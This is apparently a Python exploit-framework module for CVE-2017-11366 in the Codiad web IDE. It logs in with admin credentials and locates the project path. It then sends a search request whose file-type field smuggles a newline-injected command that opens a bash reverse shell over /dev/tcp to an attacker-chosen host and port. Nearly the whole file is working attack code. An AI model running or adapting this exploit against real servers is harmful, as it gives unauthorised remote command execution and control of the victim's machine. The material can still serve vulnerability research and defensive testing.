#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import json
import logging
import sys
sys.path.append("../../")

from core.exploit.base import BaseExploit

class Exploit(BaseExploit):
    class Meta:
        vender = {
            "name":"Codiad",
            "homepage":"http://github.com/Codiad/Codiad",
        }
        max_effected_version = "2.8.4"
        cve = (2017, 11366)
        authors = [
            {
                "name":"Wang Yihang",
                "email":"wangyihanger@gmail.com",
                "homepage":"",
                "twitter":"",
            },
        ]
        references = [
            "http://www.jianshu.com/p/41ac7ac2a7af",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11366"
        ]
        vulnerability = "Remote Command Execution"

    options = {
        "remote_host": {"default": "127.0.0.1", "necessity":True},
        "remote_port": {"default": 80, "necessity":True},
        "local_host": {"default": "8.8.8.8", "necessity":True},
        "local_port": {"default": 8888, "necessity":True},
        "admin_user": {"default": "admin", "necessity":True},
        "admin_pwd": {"default": "admin", "necessity":True},
    }

    session = requests.Session()

    def login(self):
        url = "http://%s:%d/components/user/controller.php?action=authenticate" % (self.get_option("remote_host"), int(self.get_option("remote_port")))
        data = {
            "username":self.get_option("admin_user"),
            "password":self.get_option("admin_pwd"),
            "theme":"default",
            "language":"en"
        }
        response = self.session.post(url, data=data)
        content = response.content
        print "[+] Login Content : %s" % (content)
        if 'status":"success"' in content:
            return True
        else:
            return False

    def get_write_able_path(self):
        url = "http://%s:%d/components/user/controller.php?action=get_current" % (self.get_option("remote_host"), int(self.get_option("remote_port")))
        response = self.session.get(url)
        content = response.content
        print content
        print "[+] Path Content : %s" % (content)
        json_obj = json.loads(content)
        if json_obj['status'] == "success":
            return json_obj['data']['path']
        else:
            return False

    def get_write_able_path(self):
        url = "http://%s:%d/components/project/controller.php?action=get_current" % (self.get_option("remote_host"), int(self.get_option("remote_port")))
        response = self.session.get(url)
        content = response.content
        print "[+] Path Content : %s" % (content)
        json_obj = json.loads(content)
        if json_obj['status'] == "success":
            return json_obj['data']['path']
        else:
            return False

    def exploit(self):
        remote_host = self.get_option("remote_host")
        remote_port = int(self.get_option("remote_port"))

        logging.info("Logining...")
        if self.login():
            logging.success("Login successfully!")
        else:
            logging.error("Login failed!")
            return False

        logging.info("Getting writable path...")
        path = self.get_write_able_path()
        if path == False:
            logging.error("Get current path error!")
            return False
        logging.info("Writable Path: %s" % (path))

        local_host = self.get_option("local_host")
        local_port = int(self.get_option("local_port"))
        logging.info("Getting reverse shell at %s:%d" % (local_host, local_port))

        url = "http://%s:%d/components/filemanager/controller.php?action=search&path=%s" % (remote_host, remote_port, path)
        payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F'''+local_host+'''%2F'''+str(local_port)+'''+0%3E%261'%0Agrep+%22SniperOJ'''
        data = "search_string=Hacker&search_file_type=" + payload
        headers = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
        try:
            response = self.session.post(url, data=data, headers=headers, timeout=3)
            content = response.content
            print content
            if content == '''{"status":"error","message":"No Results Returned"}''':
                logging.error("If your see this message immediately, three reasons:")
                logging.error("1. you just haved exit the reverse shell.")
                logging.error("2. the target server cannot access your vps server")
                logging.error("3. you havn't start listen a port on your vps server (%s:%d), so connection failed." % (self.get_option("local_host"), self.get_option("local_port")))
        except Exception as e:
            logging.success(str(e))
            logging.success("Please check your reverse shell at %s:%d" % (self.get_option("local_host"), self.get_option("local_port")))


def main():
    exploit = Exploit()
    exploit.show_info()
    exploit.set_option("remote_host", "127.0.0.1")
    exploit.set_option("local_host", "127.0.0.1")
    exploit.set_option("local_port", 5555)
    exploit.show_options()
    exploit.exploit()

if __name__ == "__main__":
    main()
